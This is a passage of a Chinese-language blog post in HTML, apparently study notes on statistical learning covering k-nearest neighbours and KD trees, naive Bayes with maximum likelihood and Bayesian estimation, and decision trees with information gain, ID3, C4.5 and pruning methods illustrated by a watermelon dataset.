href="#3-2-2-距离度量" class="headerlink" title="3.2.2 距离度量"></a>3.2.2 距离度量</h3><img src="/posts/498ab7d9/3.2.2.png" class="" title="距离度量"><img src="/posts/498ab7d9/3.2.3.png" class="" title="距离度量"><img src="/posts/498ab7d9/3.2.4.png" class="" title="例子"><img src="/posts/498ab7d9/3.2.5.png" class="" title="例子"><img src="/posts/498ab7d9/3.2.6.png" class="" title="例子"><h3 id="3-2-3-K值的选择"><a href="#3-2-3-K值的选择" class="headerlink" title="3.2.3 K值的选择"></a>3.2.3 K值的选择</h3><p>近似误差：可以理解为对现有训练集的训练误差。</p><p>估计误差：可以理解为对测试集的测试误差。</p><img src="/posts/498ab7d9/3.2.7.png" class="" title="K值的选择"><h3 id="3-2-4-分类决策规则"><a href="#3-2-4-分类决策规则" class="headerlink" title="3.2.4 分类决策规则"></a>3.2.4 分类决策规则</h3><img src="/posts/498ab7d9/3.2.8.png" class="" title="分类决策规则"><img src="/posts/498ab7d9/3.2.9.png" class="" title="分类决策规则"><img src="/posts/498ab7d9/3.2.10.png" class="" title="分类决策规则"><h2 id="3-3-构造KD树"><a href="#3-3-构造KD树" class="headerlink" title="3.3 构造KD树"></a>3.3 构造KD树</h2><img src="/posts/498ab7d9/3.3.1.png" class="" title="什么是KD树"><img src="/posts/498ab7d9/3.3.2.png" class="" title="构造KD树"><p>例子：</p><img src="/posts/498ab7d9/3.3.3.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.4.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.5.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.6.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.7.png" class="" title="构造KD树例子"><img src="/posts/498ab7d9/3.3.8.png" class="" title="构造KD树例子"><h2 id="3-4-搜索KD树"><a href="#3-4-搜索KD树" class="headerlink" title="3.4 搜索KD树"></a>3.4 搜索KD树</h2><p>最近邻搜索：</p><ul><li>寻找“当前最近点”：寻找最近邻的子结点作为目标点的“当前最近点”</li><li>回溯：以目标点和“当前最近点”的距离沿树根部进行回溯和迭代</li></ul><p>最近邻搜索算法：</p><img src="/posts/498ab7d9/3.4.1.png" class="" title="最近邻搜索算法"><p>例子：</p><img src="/posts/498ab7d9/3.4.2.png" class="" title="最近邻搜索算法例子"><img src="/posts/498ab7d9/3.4.3.png" class="" title="最近邻搜索算法例子"><img src="/posts/498ab7d9/3.4.4.png" class="" title="最近邻搜索算法例子"><h1 id="4-朴素贝叶斯法"><a href="#4-朴素贝叶斯法" class="headerlink" title="4. 朴素贝叶斯法"></a>4. 朴素贝叶斯法</h1><h2 id="4-1-贝叶斯定理"><a href="#4-1-贝叶斯定理" class="headerlink" title="4.1 贝叶斯定理"></a>4.1 贝叶斯定理</h2><p>条件概率公式：</p><script type="math/tex; mode=display">P(X=x|Y=y_i)=\frac {P(X=x,Y=y_i)}{P(Y=y_i)}</script><p>全概率公式：</p><script type="math/tex; mode=display">P(X=x)=\sum_{i=1}^nP(Y=y_i)P(X=x|Y=y_i)</script><p>贝叶斯公式：</p><script type="math/tex; mode=display">P(Y=y_i|X=x)=\frac {P(X=x,Y=y_i)}{P(X=x)}</script><p>根据条件概率公式，得到最终的贝叶斯公式：</p><script type="math/tex; mode=display">P(Y=y_i|X=x)=\frac{P(Y=y_i)P(X=x|Y=y_i)}{\sum_{i=1}^nP(Y=y_i)P(X=x|Y=y_i)}</script><img src="/posts/498ab7d9/4.1.3.png" class="" title="贝叶斯定理"><img src="/posts/498ab7d9/4.1.4.png" class="" title="朴素贝叶斯"><img src="/posts/498ab7d9/4.1.5.png" class="" title="朴素贝叶斯分类"><h2 id="4-2-何为朴素"><a href="#4-2-何为朴素" class="headerlink" title="4.2 何为朴素"></a>4.2 何为朴素</h2><img src="/posts/498ab7d9/4.1.1.png" class="" title="朴素贝叶斯"><img src="/posts/498ab7d9/4.1.2.png" class="" title="朴素贝叶斯"><p>参数个数：</p><img src="/posts/498ab7d9/4.2.1.png" class="" title="朴素贝叶斯"><p>“朴素”即为条件独立性假设，即特征之间相互独立。</p><img src="/posts/498ab7d9/4.2.2.png" class="" title="朴素贝叶斯"><h2 id="4-3-后验概率最大化"><a href="#4-3-后验概率最大化" class="headerlink" title="4.3 后验概率最大化"></a>4.3 后验概率最大化</h2><p>将期望风险最小化转化为后验概率最大化的问题。</p><img src="/posts/498ab7d9/4.3.1.png" class="" title="后验概率最大化"><h2 id="4-4-极大似然估计"><a href="#4-4-极大似然估计" class="headerlink" title="4.4 极大似然估计"></a>4.4 极大似然估计</h2><img src="/posts/498ab7d9/4.4.1.png" class="" title="先验概率与条件概率"><p>极大似然估计原理：</p><img src="/posts/498ab7d9/4.4.2.png" class="" title="极大似然估计原理"><p>极大似然估计实现：</p><img src="/posts/498ab7d9/4.4.3.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.4.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.5.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.6.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.7.png" class="" title="极大似然估计例子"><img src="/posts/498ab7d9/4.4.8.png" class="" title="极大似然估计例子"><h2 id="4-5-算法"><a href="#4-5-算法" class="headerlink" title="4.5 算法"></a>4.5 算法</h2><img src="/posts/498ab7d9/4.5.1.png" class="" title="朴素贝叶斯算法"><img src="/posts/498ab7d9/4.5.2.png" class="" title="朴素贝叶斯例子"><img src="/posts/498ab7d9/4.5.3.png" class="" title="朴素贝叶斯例子"><h2 id="4-6-贝叶斯估计"><a href="#4-6-贝叶斯估计" class="headerlink" title="4.6 贝叶斯估计"></a>4.6 贝叶斯估计</h2><img src="/posts/498ab7d9/4.6.1.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.2.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.3.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.4.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.5.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.6.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.7.png" class="" title="贝叶斯估计"><img src="/posts/498ab7d9/4.6.8.png" class="" title="正则化"><img src="/posts/498ab7d9/4.6.9.png" class="" title="贝叶斯估计"><h1 id="5-决策树"><a href="#5-决策树" class="headerlink" title="5. 决策树"></a>5. 决策树</h1><p>分类决策树模型是一种描述对实例进行分类的树形结构。</p><img src="/posts/498ab7d9/5.1.1.png" class="" title="决策树"><p>决策树是通过一系列规则对数据进行分类的过程。</p><p>If-Then规则：</p><img src="/posts/498ab7d9/5.1.2.png" class="" title="If-Then规则"><p>构建决策树：</p><ol><li>构建根节点</li><li>选择最优特征，以此分割训练数据集</li><li>若子集被基本正确分类，构建叶结点；否则，继续选择新的最优特征</li><li>重复2、3步，直到所有训练数据子集被正确分类</li></ol><h2 id="5-1-条件概率分布"><a href="#5-1-条件概率分布" class="headerlink" title="5.1 条件概率分布"></a>5.1 条件概率分布</h2><img src="/posts/498ab7d9/5.1.3.png" class="" title="条件概率分布"><p>当单元c的条件概率满足<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="23.556ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10411.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(751,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1140,0)"><path data-c="1D44C" d="M66 637Q54 637 49 637T39 638T32 641T30 647T33 664T42 682Q44 683 56 683Q104 680 165 680Q288 680 306 683H316Q322 677 322 674T320 656Q316 643 310 637H298Q242 637 242 624Q242 619 292 477T343 333L346 336Q350 340 358 349T379 373T411 410T454 461Q546 568 561 587T577 618Q577 634 545 637Q528 637 528 647Q528 649 530 661Q533 676 535 679T549 683Q551 683 578 682T657 680Q684 680 713 681T746 682Q763 682 763 673Q763 669 760 657T755 643Q753 637 734 637Q662 632 617 587Q608 578 477 424L348 273L322 169Q295 62 295 57Q295 46 363 46Q379 46 384 45T390 35Q390 33 388 23Q384 6 382 4T366 1Q361 1 324 1T232 2Q170 2 138 2T102 1Q84 1 84 9Q84 14 87 24Q88 27 89 30T90 35T91 39T93 42T96 44T101 45T107 45T116 46T129 46Q168 47 180 50T198 63Q201 68 227 171L252 274L129 623Q128 624 127 625T125 627T122 629T118 631T113 633T105 634T96 635T83 636T66 637Z"></path></g><g data-mml-node="mo" transform="translate(2180.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3236.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(4014.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4514.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(4792.6,0)"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g><g data-mml-node="mo" transform="translate(5922.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(6978.1,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mo" transform="translate(7411.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8077.9,0)"><path data-c="3E" d="M84 520Q84 528 88 533T96 539L99 540Q106 540 253 471T544 334L687 265Q694 260 694 250T687 235Q685 233 395 96L107 -40H101Q83 -38 83 -20Q83 -19 83 -17Q82 -10 98 -1Q117 9 248 71Q326 108 378 132L626 250L378 368Q90 504 86 509Q84 513 84 520Z"></path></g><g data-mml-node="mn" transform="translate(9133.7,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)"></path></g></g></g></svg></mjx-container>时，则认为该单元属于正类。</p><img src="/posts/498ab7d9/5.1.4.png" class="" title="条件概率分布"><h2 id="5-2-决策树学习"><a href="#5-2-决策树学习" class="headerlink" title="5.2 决策树学习"></a>5.2 决策树学习</h2><img src="/posts/498ab7d9/5.2.1.png" class="" title="决策树学习"><img src="/posts/498ab7d9/5.2.2.png" class="" title="决策树学习"><h2 id="5-3-特征选择"><a href="#5-3-特征选择" class="headerlink" title="5.3 特征选择"></a>5.3 特征选择</h2><img src="/posts/498ab7d9/5.2.3.png" class="" title="特征选择"><img src="/posts/498ab7d9/5.2.4.png" class="" title="特征选择"><img src="/posts/498ab7d9/5.2.5.png" class="" title="特征选择"><p>根据选择不同的特征作为根结点所得到的决策树不同。那么，如何进行特征选择呢？信息增益。</p><img src="/posts/498ab7d9/5.2.6.png" class="" title="熵"><img src="/posts/498ab7d9/5.2.7.png" class="" title="信息增益"><img src="/posts/498ab7d9/5.2.8.png" class="" title="信息增益"><p>例子：</p><img src="/posts/498ab7d9/5.2.9.png" class="" title="经验熵"><p>计算年龄特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.10.png" class="" title="条件经验熵"><p>计算工作特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.11.png" class="" title="条件经验熵"><p>计算有房子特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.12.png" class="" title="条件经验熵"><p>计算信贷情况特征的经验条件熵：</p><img src="/posts/498ab7d9/5.2.13.png" class="" title="条件经验熵"><p>信息增益：</p><img src="/posts/498ab7d9/5.2.14.png" class="" title="信息增益"><p>哪个带来的信息增益最大选哪个特征作为根结点。</p><p>信息增益比：</p><img src="/posts/498ab7d9/5.2.17.png" class="" title="信息增益比"><img src="/posts/498ab7d9/5.2.15.png" class="" title="信息增益比"><p>哪个信息增益比最大选哪个特征作为根结点。</p><p>信息增益倾向于某个取值较多的特征，信息增益比倾向于某个取值较少的特征。</p><img src="/posts/498ab7d9/5.2.16.png" class="" title="信息增益与信息增益比"><h2 id="5-4-决策树的生成"><a href="#5-4-决策树的生成" class="headerlink" title="5.4 决策树的生成"></a>5.4 决策树的生成</h2><h3 id="5-4-1-ID3算法"><a href="#5-4-1-ID3算法" class="headerlink" title="5.4.1 ID3算法"></a>5.4.1 ID3算法</h3><img src="/posts/498ab7d9/5.2.18.png" class="" title="ID3算法"><p>例子：</p><img src="/posts/498ab7d9/5.2.20.png" class="" title="ID3算法例子"><img src="/posts/498ab7d9/5.2.21.png" class="" title="ID3算法例子"><img src="/posts/498ab7d9/5.2.22.png" class="" title="ID3算法例子"><img src="/posts/498ab7d9/5.2.23.png" class="" title="ID3算法例子"><img src="/posts/498ab7d9/5.2.24.png" class="" title="ID3算法例子"><img src="/posts/498ab7d9/5.2.25.png" class="" title="ID3算法例子"><img src="/posts/498ab7d9/5.2.26.png" class="" title="ID3算法例子"><h3 id="5-4-2-C4-5算法"><a href="#5-4-2-C4-5算法" class="headerlink" title="5.4.2 C4.5算法"></a>5.4.2 C4.5算法</h3><img src="/posts/498ab7d9/5.2.19.png" class="" title="C4.5算法"><h2 id="5-5-剪枝"><a href="#5-5-剪枝" class="headerlink" title="5.5 剪枝"></a>5.5 剪枝</h2><img src="/posts/498ab7d9/5.5.1.png" class="" title="剪枝"><img src="/posts/498ab7d9/5.5.2.png" class="" title="剪枝"><img src="/posts/498ab7d9/5.5.3.png" class="" title="剪枝"><h3 id="5-5-1-预剪枝"><a href="#5-5-1-预剪枝" class="headerlink" title="5.5.1 预剪枝"></a>5.5.1 预剪枝</h3><p>预剪枝的几个方法：</p><ol><li>限定决策树的深度</li><li>设置一个阈值</li><li>设置某个指标，比较结点划分前后的泛化能力</li></ol><p>例子：</p><img src="/posts/498ab7d9/5.5.4.png" class="" title="预剪枝"><p>深度为4，假设限定决策树的深度为2：</p><img src="/posts/498ab7d9/5.5.5.png" class="" title="预剪枝"><img src="/posts/498ab7d9/5.5.6.png" class="" title="预剪枝"><p>设定阈值为0.4：</p><img src="/posts/498ab7d9/5.5.7.png" class="" title="预剪枝"><p>设置阈值过大，导致欠拟合现象。</p><p>设置某个指标，比较结点划分前后的泛化能力：</p><img src="/posts/498ab7d9/5.5.8.png" class="" title="预剪枝"><p>此时的误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.79ex" role="img" focusable="false" viewBox="0 -872.7 793.6 1233.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>。</p><img src="/posts/498ab7d9/5.5.9.png" class="" title="预剪枝"><img src="/posts/498ab7d9/5.5.10.png" class="" title="预剪枝"><p>经过计算，脐部特征的信息增益最大，将它作为根结点。判断测试集的泛化能力，误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，比之前的误差率小，所以应该继续往下递归。</p><img src="/posts/498ab7d9/5.5.11.png" class="" title="预剪枝"><p>在脐部的特征值为凹陷的训练集中，色泽的信息增益最大，将它作为子树。</p><img src="/posts/498ab7d9/5.5.12.png" class="" title="预剪枝"><p>此时算出误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.771ex" role="img" focusable="false" viewBox="0 -864.2 793.6 1224.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，比<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>大，所以泛化能力下降，应该将它预剪枝。</p><img src="/posts/498ab7d9/5.5.13.png" class="" title="预剪枝"><p>在脐部的特征值为稍凹的训练集中，根蒂的信息增益最大，将它作为子树。</p><img src="/posts/498ab7d9/5.5.14.png" class="" title="预剪枝"><p>此时算出误差率为<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex" xmlns="http://www.w3.org/2000/svg" width="1.795ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 793.6 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container>，与之前误差率相同。根据奥卡姆剃刀原理，在相同效果下，越简单越好，所以也将它预剪枝。</p><img src="/posts/498ab7d9/5.5.15.png" class="" title="预剪枝"><p>在脐部的特征值为平坦的训练集中，全是坏瓜，没有必要再次做划分。</p><h3 id="5-5-2-后剪枝"><a href="#5-5-2-后剪枝" class="headerlink" title="5.5.2 后剪枝"></a>5.5.2 后剪枝</h3><p>后剪枝的几个方法：</p><ol><li>降低错误剪枝(REP)</li><li>悲观错误剪枝(PEP)</li><li>最小误差剪枝(MEP)</li><li>基于错误的剪枝(EBP)</li><li>代价-复杂度剪枝(CCP)</li></ol><h4 id="5-5-2-1-降低错误剪枝-REP"><a href="#5-5-2-1-降低错误剪枝-REP" class="headerlink" title="5.5.2.1 降低错误剪枝(REP)"></a>5.5.2.1 降低错误剪枝(REP)</h4><img src="/posts/498ab7d9/5.5.16.png" class="" title="降低错误剪枝"><img src="/posts/498ab7d9/5.5.17.png" class="" title="降低错误剪枝"><img src="/posts/498ab7d9/5.5.18.png" class="" title="降低错误剪枝"><p>如果不剪枝，误判个数为2：</p><img src="/posts/498ab7d9/5.5.19.png" class="" title="降低错误剪枝"><p>剪枝后误判个数为1个，所以应该剪枝：</p><img src="/posts/498ab7d9/5.5.20.png" class="" title="降低错误剪枝"><img src="/posts/498ab7d9/5.5.21.png" class="" title="降低错误剪枝"><p>继续看能不能从3层变2层，色泽中的三个特征值有两个判断为好瓜，所以直接将稍蜷缩的判断为好瓜。</p><p>在剪枝前，误判个数为1个：</p><img src="/posts/498ab7d9/5.5.22.png" class="" title="降低错误剪枝"><p>在剪枝后，误判个数为1个：</p><img src="/posts/498ab7d9/5.5.23.png" class="" title="降低错误剪枝"><p>根据奥卡姆剃刀原理，选择剪枝。</p><p>继续看能不能从2层变1层，分别判断色泽特征和根蒂特征。最后可以得出是可以的：</p><img src="/posts/498ab7d9/5.5.24.png" class="" title="降低错误剪枝"><h4 id="5-5-2-2-悲观错误剪枝-PEP"><a href="#5-5-2-2-悲观错误剪枝-PEP" class="headerlink" title="5.5.2.2 悲观错误剪枝(PEP)"></a>5.5.2.2 悲观错误剪枝(PEP)</h4><p>原理：根据剪枝前后的错误率来决定是否剪枝。和REP不同之处在于PEP只需要训练集即可，不需要验证集，并且PEP是自上而下剪枝的。</p><img 